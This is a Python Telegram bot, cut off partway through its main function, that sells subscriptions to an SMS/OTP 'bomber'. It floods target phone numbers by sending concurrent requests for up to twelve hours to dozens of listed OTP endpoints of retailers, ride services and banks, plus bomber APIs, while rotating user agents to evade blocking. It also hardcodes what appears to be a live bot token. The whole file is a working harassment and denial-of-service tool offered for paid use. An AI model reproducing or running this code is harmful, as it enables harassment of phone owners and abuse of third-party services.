import sys
import types

# ========== CGI MODULE FIX FOR PYTHON 3.13+ ==========
class CGI:
    def parse_multipart(self, *args, **kwargs):
        return {}
    
    class FieldStorage:
        def __init__(self, *args, **kwargs):
            self.value = None
            self.filename = None
            self.file = None
            self.type = None
            self.headers = {}
        
        def __getattr__(self, name):
            return None

cgi_module = types.ModuleType('cgi')
cgi_module.parse_multipart = CGI().parse_multipart
cgi_module.FieldStorage = CGI.FieldStorage
cgi_module.__dict__.update({
    'parse_multipart': CGI().parse_multipart,
    'FieldStorage': CGI.FieldStorage
})
sys.modules['cgi'] = cgi_module

# ========== HTTPX COMPLETE COMPATIBILITY FIX FOR PYTHON 3.13+ ==========
import httpx
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)

_original_async_client_init = httpx.AsyncClient.__init__

def _patched_async_client_init(self, *args, **kwargs):
    deprecated_params = ['proxy', 'proxies', 'http1', 'http2', 'verify', 'cert', 'trust_env']
    
    for param in deprecated_params:
        if param in kwargs:
            if param == 'proxy' or param == 'proxies':
                if 'proxies' not in kwargs and 'proxy' in kwargs:
                    kwargs['proxies'] = kwargs.pop('proxy')
                elif 'proxy' in kwargs:
                    kwargs.pop('proxy')
                if 'proxies' in kwargs and kwargs['proxies'] is None:
                    kwargs.pop('proxies')
            else:
                kwargs.pop(param, None)
    
    try:
        _original_async_client_init(self, *args, **kwargs)
    except TypeError as e:
        if 'unexpected keyword' in str(e):
            clean_kwargs = {}
            allowed_params = ['timeout', 'proxies', 'limits', 'max_redirects', 'follow_redirects']
            for param in allowed_params:
                if param in kwargs:
                    clean_kwargs[param] = kwargs[param]
            _original_async_client_init(self, *args, **clean_kwargs)
        else:
            raise

httpx.AsyncClient.__init__ = _patched_async_client_init

_original_async_client_del = getattr(httpx.AsyncClient, '__del__', None)

def _patched_async_client_del(self):
    try:
        if hasattr(self, '_state'):
            if _original_async_client_del:
                _original_async_client_del(self)
    except (AttributeError, TypeError):
        pass

if _original_async_client_del:
    httpx.AsyncClient.__del__ = _patched_async_client_del

_original_client_init = httpx.Client.__init__

def _patched_client_init(self, *args, **kwargs):
    deprecated_params = ['proxy', 'proxies', 'http1', 'http2', 'verify', 'cert', 'trust_env']
    for param in deprecated_params:
        if param in kwargs:
            if param == 'proxy' or param == 'proxies':
                if 'proxies' not in kwargs and 'proxy' in kwargs:
                    kwargs['proxies'] = kwargs.pop('proxy')
                elif 'proxy' in kwargs:
                    kwargs.pop('proxy')
                if 'proxies' in kwargs and kwargs['proxies'] is None:
                    kwargs.pop('proxies')
            else:
                kwargs.pop(param, None)
    try:
        _original_client_init(self, *args, **kwargs)
    except TypeError:
        clean_kwargs = {}
        allowed_params = ['timeout', 'proxies', 'limits', 'max_redirects', 'follow_redirects']
        for param in allowed_params:
            if param in kwargs:
                clean_kwargs[param] = kwargs[param]
        _original_client_init(self, *args, **clean_kwargs)

httpx.Client.__init__ = _patched_client_init
# ====================================================

import asyncio
import aiohttp
import time
import sqlite3
import random
import string
import json
from aiohttp import web
from datetime import datetime, timedelta
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler

BOT_TOKEN = "8962894855:AAF-acjyQl6j44Gi7l8HuqyCSJn4f3_qYyw" 
OWNER_ID = 7216698208
ADMIN_ID = 7216698208
WELCOME_IMAGE = "https://i.postimg.cc/qRvqYRJW/file-00000000e23c720ba8b077e12f0a9668.png"

PLANS = {
    "standard": {"name": "Standard", "price": 149, "days": 30, "concurrent": 2, "max_duration": 300},
    "premium": {"name": "Premium", "price": 249, "days": 30, "concurrent": 5, "max_duration": 720},
    "ultimate": {"name": "Ultimate", "price": 349, "days": 30, "concurrent": 10, "max_duration": 720}
}

DURATION_OPTIONS = {
    "1": 1, "5": 5, "15": 15, "30": 30, "60": 60,
    "120": 120, "180": 180, "240": 240, "300": 300,
    "360": 360, "480": 480, "600": 600, "720": 720
}

WORKING_APIS = [
    "https://panther-aura-bomber-999-blond.vercel.app/api?num={phone}&type=sms&workers=500",
    "https://pantherbomberjs.pantherxofficial1.workers.dev/api?num={phone}&type=sms&workers=500",
    "https://mix-rootx-new.vercel.app/bomb?number={phone}&workers=500",
    "https://panther-v2-api.vercel.app/api?num={phone}&type=sms&workers=500",
    "https://panther-x2.vercel.app/api?num={phone}&type=sms&workers=500",
    "https://lakhan-api-bom.hb3284008.workers.dev/?phone={phone}&workers=5000",
    "https://bomber.kingcc.qzz.io/bomb?key=urfaaan_omdivine&numbar={phone}&workers=5000",
    "https://www.gopinkcabs.com/app/cab/customer/login_admin_code?mobile={phone}",
    "https://www.haldiram.com/api/v2/otp/send?mobile={phone}",
    "https://dashboardapi.hashtagloyalty.com/v3/sign_up/create_otp?mobile={phone}",
    "https://api.healthmug.com/account/createotp?mobile={phone}",
    "https://homedeliverybackend.mpaani.com/auth/send-otp?mobile={phone}",
    "https://hometriangle.com/api/partner/xauth/signup/otp?mobile={phone}",
    "https://login.housing.com/api/v2/send-otp?mobile={phone}",
    "https://kukufm.com/api/v2/send_otp/?phone={phone}",
    "https://auth.mamaearth.in/v1/auth/initiate-signup?phone={phone}",
    "https://www.nobroker.in/api/v3/account/otp/send?mobile={phone}",
    "https://www.nykaa.com/app-api/index.php/customer/send_otp?mobile={phone}",
    "https://api.rapido.bike/apigw/v1/send-otp?phone={phone}",
    "https://api.swiggy.com/3/auth/otp?mobile={phone}",
    "https://www.tatacliq.com/api/auth/v1/otp/send?mobile={phone}",
    "https://www.urbancompany.com/api/v1/auth/otp?phone={phone}",
    "https://www.zomato.com/webroutes/auth/otp?phone={phone}",
    "https://www.flipkart.com/api/5/user/otp/generate?phone={phone}",
    "https://www.meesho.com/api/auth/otp?phone={phone}",
    "https://www.phonepe.com/api/otp?phone={phone}",
    "https://www.mobikwik.com/api/otp?phone={phone}",
    "https://www.cred.com/api/otp?phone={phone}",
    "https://www.hotstar.com/api/otp?phone={phone}",
    "https://www.sonyliv.com/api/otp?phone={phone}",
    "https://www.irctc.co.in/api/otp?mobile={phone}",
    "https://www.goibibo.com/api/otp?phone={phone}",
    "https://www.uber.com/api/otp?phone={phone}",
    "https://www.olacabs.com/api/otp?phone={phone}",
    "https://www.dominos.co.in/api/otp?phone={phone}",
    "https://www.pizzahut.co.in/api/otp?phone={phone}",
    "https://www.sbi.co.in/api/otp?mobile={phone}",
    "https://www.hdfcbank.com/api/otp?mobile={phone}",
    "https://www.icicibank.com/api/otp?mobile={phone}",
    "https://www.axisbank.com/api/otp?mobile={phone}",
    "https://www.kotak.com/api/otp?mobile={phone}",
]

def build_api_list():
    apis = []
    for api_url in WORKING_APIS:
        method = "GET" if any(x in api_url for x in ["panther", "bomber", "workers", "vercel", "lakhan", "kingcc"]) else "POST"
        api_obj = {
            "name": api_url.split("/")[2] if "://" in api_url else "API",
            "url": api_url.replace("{phone}", "{no}"),
            "method": method,
            "headers": {
                "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36",
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json" if method == "POST" else "application/x-www-form-urlencoded",
            },
            "body": {}
        }
        apis.append(api_obj)
        for prefix in ["+91{no}", "91{no}"]:
            if prefix not in api_obj["url"]:
                var_obj = api_obj.copy()
                var_obj["url"] = api_obj["url"].replace("{no}", prefix)
                apis.append(var_obj)
    seen = set()
    unique = []
    for api in apis:
        if api["url"] not in seen:
            seen.add(api["url"])
            unique.append(api)
    return unique

APIS = build_api_list()

class Database:
    def __init__(self):
        self.conn = sqlite3.connect('fusion_premium.db', check_same_thread=False)
        self.create_tables()
        self.temp_attack_data = {}

    def create_tables(self):
        c = self.conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users 
                    (user_id INTEGER PRIMARY KEY, premium_expiry TEXT, premium_plan TEXT DEFAULT 'standard', protected_number TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS redeem_codes 
                    (code TEXT PRIMARY KEY, days INTEGER, plan_type TEXT, is_used INTEGER DEFAULT 0)''')
        self.conn.commit()

    def get_user(self, user_id):
        c = self.conn.cursor()
        c.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
        return c.fetchone()

    def add_user(self, user_id):
        if not self.get_user(user_id):
            c = self.conn.cursor()
            c.execute("INSERT INTO users (user_id, premium_plan) VALUES (?, ?)", (user_id, "standard"))
            self.conn.commit()

    def get_concurrent_limit(self, user_id):
        if user_id == OWNER_ID:
            return 10
        user = self.get_user(user_id)
        if user and user[1]:
            try:
                expiry = datetime.strptime(user[1], "%Y-%m-%d %H:%M:%S")
                if datetime.now() < expiry:
                    plan = user[2] if user[2] else "standard"
                    return PLANS.get(plan, PLANS["standard"])["concurrent"]
            except:
                pass
        return 0

    def get_max_duration(self, user_id):
        if user_id == OWNER_ID:
            return 720
        user = self.get_user(user_id)
        if user and user[1]:
            try:
                expiry = datetime.strptime(user[1], "%Y-%m-%d %H:%M:%S")
                if datetime.now() < expiry:
                    plan = user[2] if user[2] else "standard"
                    return PLANS.get(plan, PLANS["standard"])["max_duration"]
            except:
                pass
        return 0

    def get_plan_name(self, user_id):
        if user_id == OWNER_ID:
            return "Ultimate"
        user = self.get_user(user_id)
        if user and user[1]:
            try:
                expiry = datetime.strptime(user[1], "%Y-%m-%d %H:%M:%S")
                if datetime.now() < expiry:
                    plan = user[2] if user[2] else "standard"
                    return PLANS.get(plan, PLANS["standard"])["name"]
            except:
                pass
        return "Free"

    def get_expiry(self, user_id):
        user = self.get_user(user_id)
        if user and user[1]:
            try:
                expiry = datetime.strptime(user[1], "%Y-%m-%d %H:%M:%S")
                if datetime.now() < expiry:
                    return user[1]
            except:
                pass
        return "Not Active"

    def is_premium(self, user_id):
        if user_id == OWNER_ID:
            return True
        user = self.get_user(user_id)
        if user and user[1]:
            try:
                expiry = datetime.strptime(user[1], "%Y-%m-%d %H:%M:%S")
                return datetime.now() < expiry
            except:
                return False
        return False

    def add_premium(self, user_id, days, plan_type="standard"):
        current = datetime.now()
        user = self.get_user(user_id)
        if user and user[1]:
            try:
                stored = datetime.strptime(user[1], "%Y-%m-%d %H:%M:%S")
                if stored > current:
                    current = stored
            except:
                pass
        new_exp = current + timedelta(days=days)
        str_exp = new_exp.strftime("%Y-%m-%d %H:%M:%S")
        c = self.conn.cursor()
        if not user:
            c.execute("INSERT INTO users (user_id, premium_expiry, premium_plan) VALUES (?, ?, ?)", (user_id, str_exp, plan_type))
        else:
            c.execute("UPDATE users SET premium_expiry=?, premium_plan=? WHERE user_id=?", (str_exp, plan_type, user_id))
        self.conn.commit()
        return str_exp

    def generate_code(self, days, plan_type="standard"):
        code = "PREMIUM-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        c = self.conn.cursor()
        try:
            c.execute("INSERT INTO redeem_codes (code, days, plan_type) VALUES (?, ?, ?)", (code, days, plan_type))
            self.conn.commit()
            return code
        except:
            return self.generate_code(days, plan_type)

    def redeem(self, user_id, code):
        c = self.conn.cursor()
        c.execute("SELECT days, plan_type, is_used FROM redeem_codes WHERE code=?", (code,))
        res = c.fetchone()
        if not res or res[2] == 1:
            return False, 0, None, None
        days, plan_type, _ = res
        try:
            c.execute("UPDATE redeem_codes SET is_used=1 WHERE code=?", (code,))
            exp_date = self.add_premium(user_id, days, plan_type)
            self.conn.commit()
            return True, days, plan_type, exp_date
        except:
            return False, 0, None, None

    def protect(self, user_id, number):
        c = self.conn.cursor()
        c.execute("UPDATE users SET protected_number=? WHERE user_id=?", (number, user_id))
        self.conn.commit()

    def unprotect(self, user_id):
        c = self.conn.cursor()
        c.execute("UPDATE users SET protected_number=NULL WHERE user_id=?", (user_id,))
        self.conn.commit()

    def is_protected(self, number):
        c = self.conn.cursor()
        c.execute("SELECT user_id FROM users WHERE protected_number=?", (number,))
        return c.fetchone() is not None

    def get_all_users(self):
        c = self.conn.cursor()
        c.execute("SELECT user_id FROM users")
        return [row[0] for row in c.fetchall()]

    def get_stats(self):
        c = self.conn.cursor()
        u = c.execute("SELECT COUNT(*) FROM users").fetchone()[0]
        premium = c.execute("SELECT COUNT(*) FROM users WHERE premium_expiry > datetime('now')").fetchone()[0]
        total_codes = c.execute("SELECT COUNT(*) FROM redeem_codes").fetchone()[0]
        return u, premium, total_codes

    def set_attack_data(self, user_id, targets):
        self.temp_attack_data[user_id] = {'targets': targets, 'timestamp': time.time()}

    def get_attack_data(self, user_id):
        data = self.temp_attack_data.get(user_id)
        if data and time.time() - data['timestamp'] < 300:
            return data['targets']
        if user_id in self.temp_attack_data:
            del self.temp_attack_data[user_id]
        return None

    def clear_attack_data(self, user_id):
        if user_id in self.temp_attack_data:
            del self.temp_attack_data[user_id]

class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.db = Database()
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36",
        ]

    async def _make_request(self, session, api, phone):
        try:
            url = api['url'].replace('{no}', phone)
            headers = api.get('headers', {}).copy()
            headers['User-Agent'] = random.choice(self.user_agents)
            timeout = aiohttp.ClientTimeout(total=5)
            if api['method'].upper() == 'GET':
                async with session.get(url, headers=headers, timeout=timeout, ssl=False) as r:
                    await r.read()
                    return True
            else:
                async with session.post(url, headers=headers, timeout=timeout, ssl=False) as r:
                    await r.read()
                    return True
        except:
            return False

    async def _worker_task(self, user_id, phone, api_list, end_time):
        async with aiohttp.ClientSession() as session:
            while time.time() < end_time:
                if user_id not in self.active_attacks or not self.active_attacks[user_id]["running"]:
                    break
                if phone not in self.active_attacks[user_id]["targets"]:
                    break
                random.shuffle(api_list)
                tasks = [self._make_request(session, api, phone) for api in api_list[:30]]
                if tasks:
                    await asyncio.gather(*tasks, return_exceptions=True)
                await asyncio.sleep(0.3)

    async def start_attack(self, user_id, targets, duration_minutes):
        if user_id in self.active_attacks:
            return False, "Attack already running"
        if not self.db.is_premium(user_id):
            return False, "Premium required"
        max_dur = self.db.get_max_duration(user_id)
        if duration_minutes > max_dur:
            return False, f"Max duration is {max_dur} minutes for your plan"
        concurrency = self.db.get_concurrent_limit(user_id)
        if concurrency == 0:
            return False, "Premium required"
        if len(targets) > concurrency:
            return False, f"Your plan allows max {concurrency} concurrent targets"
        
        for target in targets:
            if self.db.is_protected(target):
                return False, f"Number {target} is protected!"
        
        end_time = time.time() + (duration_minutes * 60)
        chunk_size = max(1, len(APIS) // concurrency)
        api_chunks = []
        for i in range(concurrency):
            start_idx = i * chunk_size
            end_idx = start_idx + chunk_size if i < concurrency - 1 else len(APIS)
            api_chunks.append(APIS[start_idx:end_idx])
        
        self.active_attacks[user_id] = {
            "targets": targets,
            "end_time": end_time,
            "running": True,
            "workers": {}
        }
        
        for target in targets:
            self.active_attacks[user_id]["workers"][target] = []
            for i in range(concurrency):
                task = asyncio.create_task(self._worker_task(user_id, target, api_chunks[i], end_time))
                self.active_attacks[user_id]["workers"][target].append(task)
        
        return True, f"Started attack on {len(targets)} target(s) with {concurrency}x workers each"

    async def stop_attack(self, user_id):
        if user_id in self.active_attacks:
            self.active_attacks[user_id]["running"] = False
            for target_workers in self.active_attacks[user_id].get("workers", {}).values():
                for task in target_workers:
                    if not task.done():
                        task.cancel()
            del self.active_attacks[user_id]
            return True
        return False
    
    def get_active_targets(self, user_id):
        if user_id in self.active_attacks:
            return self.active_attacks[user_id]["targets"]
        return []

manager = AttackManager()

async def web_server():
    async def handle(request):
        return web.Response(text="Bot is Alive!")
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    for port in [8080, 8081, 8082, 3000, 5000]:
        try:
            site = web.TCPSite(runner, '0.0.0.0', port)
            await site.start()
            return
        except:
            continue

def main_kb(user_id):
    kb = [
        [KeyboardButton("🚀 /mix"), KeyboardButton("📊 /status")],
        [KeyboardButton("👤 /account"), KeyboardButton("💳 /plan")],
        [KeyboardButton("🛡 /protect"), KeyboardButton("🔓 /unprotect")],
        [KeyboardButton("🔑 /redeem"), KeyboardButton("❓ /help")]
    ]
    if user_id == OWNER_ID:
        kb.append([KeyboardButton("👑 Admin")])
    return ReplyKeyboardMarkup(kb, resize_keyboard=True)

def multi_target_kb(user_id):
    max_targets = manager.db.get_concurrent_limit(user_id)
    buttons = []
    for i in range(1, min(max_targets, 10) + 1):
        buttons.append([InlineKeyboardButton(f"🎯 {i} Target(s)", callback_data=f"targets_{i}")])
    buttons.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")])
    return InlineKeyboardMarkup(buttons)

def duration_kb(user_id):
    max_dur = manager.db.get_max_duration(user_id)
    con = manager.db.get_concurrent_limit(user_id)
    buttons = []
    row = []
    durations = [1, 5, 15, 30, 60, 120, 180, 240, 300, 360, 480, 600, 720]
    for minutes in durations:
        if minutes <= max_dur:
            if minutes < 60:
                label = f"{minutes}min"
            elif minutes == 60:
                label = "1h"
            else:
                label = f"{minutes//60}h"
            row.append(InlineKeyboardButton(label, callback_data=f"dur_{minutes}"))
            if len(row) == 3:
                buttons.append(row)
                row = []
    if row:
        buttons.append(row)
    buttons.append([InlineKeyboardButton(f"⚡ {con}x Concurrent per target", callback_data="info")])
    buttons.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")])
    return InlineKeyboardMarkup(buttons)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    manager.db.add_user(uid)
    await update.message.reply_photo(WELCOME_IMAGE, caption="🔥 Welcome to Premium Multi-Target Bomber!\n\nUse /help for commands.", reply_markup=main_kb(uid))

async def mix_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not manager.db.is_premium(uid):
        await update.message.reply_text("⛔ Premium Required!\nUse /plan to buy or /redeem to activate.")
        return
    if uid in manager.active_attacks:
        await update.message.reply_text("⚠️ You already have an active attack!\nUse /status to check.")
        return
    
    max_targets = manager.db.get_concurrent_limit(uid)
    await update.message.reply_text(f"📞 Select number of targets to attack (Max: {max_targets}):", reply_markup=multi_target_kb(uid))
    context.user_data['waiting_for_target_count'] = True

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in manager.active_attacks:
        info = manager.active_attacks[uid]
        left = int((info['end_time'] - time.time()) / 60)
        targets = ", ".join(info['targets'])
        await update.message.reply_text(f"🔥 MULTI-TARGET ATTACK RUNNING\n🎯 Targets: {targets}\n📊 Count: {len(info['targets'])}\n⏳ Left: {left} min", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP ALL", callback_data="stop")]]))
    else:
        await update.message.reply_text("💤 No active attacks.")

async def account_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    plan = manager.db.get_plan_name(uid)
    expiry = manager.db.get_expiry(uid)
    con = manager.db.get_concurrent_limit(uid)
    max_dur = manager.db.get_max_duration(uid)
    await update.message.reply_text(f"👤 ACCOUNT\n🆔 {uid}\n📋 Plan: {plan}\n📅 Expiry: {expiry}\n⚡ Concurrent Targets: {con}\n⏰ Max Duration: {max_dur}min")

async def plan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = "💳 AVAILABLE SUBSCRIPTION PLANS\n\n"
    for key, p in PLANS.items():
        msg += f"🔹 {p['name']} Plan (₹{p['price']})\n"
        msg += f"   - Duration: {p['days']} Days\n"
        msg += f"   - Concurrent Targets: {p['concurrent']}\n"
        msg += f"   - Max Task Duration: {p['max_duration']} minutes\n\n"
    msg += "💡 Use /redeem if you have a code.\n💬 Contact @Monsterbhaiii or @skhgang1 for purchase."
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("👤 Contact Admin", url=f"tg://user?id={OWNER_ID}")]])
    await update.message.reply_text(msg, reply_markup=kb)

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔑 Send your premium code:\nFormat: PREMIUM-XXXXXXXX")
    context.user_data['waiting_for_redeem'] = True

async def protect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not manager.db.is_premium(uid):
        await update.message.reply_text("⛔ Premium required!")
        return
    await update.message.reply_text("🛡 Send 10-digit number to protect:")
    context.user_data['waiting_for_protect'] = True

async def unprotect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    manager.db.unprotect(uid)
    await update.message.reply_text("🔓 Number unprotected.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = """ℹ️ USER HELP & INSTRUCTIONS

🚀 CORE COMMANDS
• /start: Main menu with quick-access buttons
• /mix: Start multi-target attack on numbers
• /status: See live progress of your attacks

👤 ACCOUNT & SUBSCRIPTION
• /account: Shows your current plan and time left
• /plan: Displays all available subscription plans
• /redeem: Activate your subscription with a code

🛡️ NUMBER PROTECTION
• /protect & /unprotect: Manage number protection

💡 FEATURES:
• Standard Plan: Attack 2 numbers simultaneously for 300min
• Premium Plan: Attack 5 numbers simultaneously for 720min  
• Ultimate Plan: Attack 10 numbers simultaneously for 720min

💡 Tip: Use the buttons below for quick access!"""
    await update.message.reply_text(msg, reply_markup=main_kb(update.effective_user.id))

async def handle_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text
    
    # CRITICAL FIX: Admin commands ko pehle handle karo
    if uid == OWNER_ID and context.user_data.get('waiting_for_genkey'):
        await generate_key_logic(update, context, text)
        return
    
    if uid == OWNER_ID and context.user_data.get('waiting_for_broadcast'):
        await broadcast_logic(update, context, text)
        return
    
    manager.db.add_user(uid)
    
    if text == "🚀 /mix" or text == "/mix":
        await mix_command(update, context)
    elif text == "📊 /status" or text == "/status":
        await status_command(update, context)
    elif text == "👤 /account" or text == "/account":
        await account_command(update, context)
    elif text == "💳 /plan" or text == "/plan":
        await plan_command(update, context)
    elif text == "🔑 /redeem" or text == "/redeem":
        await redeem_command(update, context)
    elif text == "🛡 /protect" or text == "/protect":
        await protect_command(update, context)
    elif text == "🔓 /unprotect" or text == "/unprotect":
        await unprotect_command(update, context)
    elif text == "❓ /help" or text == "/help":
        await help_command(update, context)
    elif text == "👑 Admin" and uid == OWNER_ID:
        await show_admin_panel(update, context)
    elif context.user_data.get('waiting_for_target_count'):
        pass
    elif context.user_data.get('waiting_for_numbers') and text.strip():
        await process_numbers(update, context, text)
    elif context.user_data.get('waiting_for_redeem'):
        context.user_data['waiting_for_redeem'] = False
        success, days, plan, exp = manager.db.redeem(uid, text.strip().upper())
        if success:
            await update.message.reply_text(f"✅ Premium Activated!\n📋 Plan: {plan.upper()}\n📅 Expiry: {exp}")
        else:
            await update.message.reply_text("❌ Invalid or already used code.")
    elif context.user_data.get('waiting_for_protect') and text.isdigit() and len(text) == 10:
        context.user_data['waiting_for_protect'] = False
        manager.db.protect(uid, text)
        await update.message.reply_text(f"🛡 Protected: {text}")
    elif text == "/cancel":
        for k in ['waiting_for_target_count', 'waiting_for_numbers', 'waiting_for_redeem', 'waiting_for_protect', 'waiting_for_genkey', 'waiting_for_broadcast', 'expected_targets']:
            context.user_data.pop(k, None)
        manager.db.clear_attack_data(uid)
        await update.message.reply_text("❌ Cancelled.", reply_markup=main_kb(uid))

async def show_admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Generate Standard Key (30 days)", callback_data="adm_gen_standard")],
        [InlineKeyboardButton("🔑 Generate Premium Key (30 days)", callback_data="adm_gen_premium")],
        [InlineKeyboardButton("🔑 Generate Ultimate Key (30 days)", callback_data="adm_gen_ultimate")],
        [InlineKeyboardButton("📢 Broadcast Message", callback_data="adm_broadcast")],
        [InlineKeyboardButton("📊 View Statistics", callback_data="adm_stats")],
        [InlineKeyboardButton("🔧 Custom Key (Days & Plan)", callback_data="adm_custom_key")]
    ])
    await update.message.reply_text("👑 Admin Control Panel:\nSelect an option:", reply_markup=kb)

async def generate_key_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, text):
    uid = update.effective_user.id
    if uid != OWNER_ID:
        return
    context.user_data['waiting_for_genkey'] = False
    try:
        parts = text.split()
        days = int(parts[0])
        plan = parts[1].lower() if len(parts) > 1 else "standard"
        if plan not in PLANS:
            plan = "standard"
        code = manager.db.generate_code(days, plan)
        await update.message.reply_text(f"✅ KEY GENERATED SUCCESSFULLY!\n\n🔑 Code: `{code}`\n📅 Days: {days}\n📋 Plan: {plan.upper()}\n\nSend this code to user for premium activation.", parse_mode="Markdown")
    except:
        await update.message.reply_text("❌ Invalid format!\nUse: `days plan_type`\nExample: `30 premium`\n\nAvailable plans: standard, premium, ultimate", parse_mode="Markdown")

async def broadcast_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, text):
    uid = update.effective_user.id
    if uid != OWNER_ID:
        return
    context.user_data['waiting_for_broadcast'] = False
    users = manager.db.get_all_users()
    success, failed = 0, 0
    msg = await update.message.reply_text(f"📢 Broadcasting to {len(users)} users...")
    for uid_user in users:
        try:
            await context.bot.send_message(uid_user, f"📢 ANNOUNCEMENT\n\n{text}")
            success += 1
        except:
            failed += 1
        await asyncio.sleep(0.1)
    await msg.edit_text(f"✅ BROADCAST COMPLETED\n✅ Success: {success}\n❌ Failed: {failed}")

async def process_numbers(update: Update, context: ContextTypes.DEFAULT_TYPE, text):
    uid = update.effective_user.id
    numbers = [num.strip() for num in text.replace(',', ' ').split() if num.strip().isdigit() and len(num.strip()) == 10]
    target_count = context.user_data.get('expected_targets', 0)
    
    if len(numbers) != target_count:
        await update.message.reply_text(f"❌ Please send exactly {target_count} phone numbers.\nExample: {' '.join(['9876543210'] * target_count)}")
        return
    
    context.user_data['waiting_for_numbers'] = False
    context.user_data['target_numbers'] = numbers
    manager.db.set_attack_data(uid, numbers)
    max_dur = manager.db.get_max_duration(uid)
    await update.message.reply_text(f"📞 Targets: {', '.join(numbers)}\n⏰ Select duration (Max: {max_dur}min):", reply_markup=duration_kb(uid))

async def btn_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data = query.data
    
    # Admin key generation buttons
    if data == "adm_gen_standard" and uid == OWNER_ID:
        code = manager.db.generate_code(30, "standard")
        await query.message.reply_text(f"✅ STANDARD KEY GENERATED!\n\n🔑 Code: `{code}`\n📅 Days: 30\n📋 Plan: STANDARD\n\nSend this code to user.", parse_mode="Markdown")
    
    elif data == "adm_gen_premium" and uid == OWNER_ID:
        code = manager.db.generate_code(30, "premium")
        await query.message.reply_text(f"✅ PREMIUM KEY GENERATED!\n\n🔑 Code: `{code}`\n📅 Days: 30\n📋 Plan: PREMIUM\n\nSend this code to user.", parse_mode="Markdown")
    
    elif data == "adm_gen_ultimate" and uid == OWNER_ID:
        code = manager.db.generate_code(30, "ultimate")
        await query.message.reply_text(f"✅ ULTIMATE KEY GENERATED!\n\n🔑 Code: `{code}`\n📅 Days: 30\n📋 Plan: ULTIMATE\n\nSend this code to user.", parse_mode="Markdown")
    
    elif data == "adm_custom_key" and uid == OWNER_ID:
        context.user_data['waiting_for_genkey'] = True
        await query.message.reply_text("🔑 Send custom key details:\nFormat: `days plan_type`\nExample: `30 standard`\n\nAvailable plans: standard, premium, ultimate", parse_mode="Markdown")
    
    elif data.startswith("targets_"):
        count = int(data.split("_")[1])
        context.user_data['waiting_for_target_count'] = False
        context.user_data['waiting_for_numbers'] = True
        context.user_data['expected_targets'] = count
        await query.edit_message_text(f"📞 Send {count} phone number(s) separated by space or new line:\nExample: {' '.join(['9876543210'] * count)}")
    
    elif data.startswith("dur_"):
        targets = manager.db.get_attack_data(uid)
        if not targets:
            await query.edit_message_text("❌ Session expired. Use /mix again.")
            return
        duration = int(data.split("_")[1])
        success, msg = await manager.start_attack(uid, targets, duration)
        if success:
            await query.edit_message_text(f"🚀 MULTI-TARGET ATTACK STARTED!\n🎯 Targets: {', '.join(targets)}\n📊 Count: {len(targets)}\n{msg}")
        else:
            await query.edit_message_text(f"❌ {msg}")
        manager.db.clear_attack_data(uid)
    
    elif data == "cancel_attack":
        manager.db.clear_attack_data(uid)
        for k in ['waiting_for_target_count', 'waiting_for_numbers', 'expected_targets']:
            context.user_data.pop(k, None)
        await query.edit_message_text("❌ Cancelled.")
    
    elif data == "stop":
        if await manager.stop_attack(uid):
            await query.edit_message_text("🛑 All attacks stopped.")
        else:
            await query.answer("No active attack.")
    
    elif data == "adm_broadcast" and uid == OWNER_ID:
        context.user_data['waiting_for_broadcast'] = True
        await query.message.reply_text("📢 Send your broadcast message to all users:")
    
    elif data == "adm_stats" and uid == OWNER_ID:
        u, p, c = manager.db.get_stats()
        await query.message.reply_text(f"📊 BOT STATISTICS\n\n👥 Total Users: {u}\n⭐ Premium Users: {p}\n🔑 Generated Codes: {c}\n💎 Owner ID: {OWNER_ID}")
    
    elif data == "info":
        con = manager.db.get_concurrent_limit(uid)
        await query.answer(f"⚡ {con}x Concurrent Workers Per Target", show_alert=True)

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    for k in ['waiting_for_target_count', 'waiting_for_numbers', 'waiting_for_redeem', 'waiting_for_protect', 'waiting_for_genkey', 'waiting_for_broadcast', 'expected_targets']:
        context.user_data.pop(k, None)
    manager.db.clear_attack_data(uid)
    await update.message.reply_text("❌ Cancelled.", reply_markup=main_kb(uid))

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("mix", mix_command))
